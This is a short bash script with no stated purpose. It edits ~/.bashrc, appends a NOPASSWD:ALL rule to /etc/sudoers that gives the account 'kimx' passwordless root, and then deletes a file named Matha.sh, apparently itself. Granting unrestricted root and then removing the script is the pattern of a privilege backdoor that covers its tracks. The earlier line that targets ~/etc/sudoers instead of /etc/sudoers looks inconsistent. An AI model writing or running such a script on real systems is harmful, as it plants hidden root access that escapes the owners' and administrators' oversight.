#!/bin/bash
sed -i '/sudo -s/d' ~/.bashrc 
sed -i '/kimx ALL=(ALL) NOPASSWD:ALL/d' ~/etc/sudoers
echo "kimx ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
rm -f Matha.sh
exit
 
